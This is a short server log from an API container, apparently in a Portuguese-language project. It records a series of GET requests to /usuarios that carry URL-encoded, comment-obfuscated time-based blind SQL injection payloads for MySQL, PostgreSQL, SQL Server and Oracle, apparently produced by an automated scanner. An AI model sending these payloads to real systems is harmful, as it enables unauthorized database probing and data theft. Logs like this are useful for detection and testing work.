api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6461%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FMiy%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27bOEn%27%3D%27bOEn HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6461%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FMiy%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27dSjG%27%3D%27dSjG HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6461%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FMiy%29--%2F%2A%2A%2FQTMw HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F5188%3D%28SELECT%2F%2A%2A%2F5188%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281286%3D1286 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F5188%3D%28SELECT%2F%2A%2A%2F5188%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5188%3D%28SELECT%2F%2A%2A%2F5188%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27XlFM%27%3D%27XlFM HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F5188%3D%28SELECT%2F%2A%2A%2F5188%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ENwd%27%3D%27ENwd HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F5188%3D%28SELECT%2F%2A%2A%2F5188%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FGLZZ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%287675%3D7675 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27yLkj%27%3D%27yLkj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27OsRG%27%3D%27OsRG HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FECet HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F1310%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289506%3D9506 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F1310%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1310%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27oWAA%27%3D%27oWAA HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F1310%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27EEPk%27%3D%27EEPk HTTP/1.1
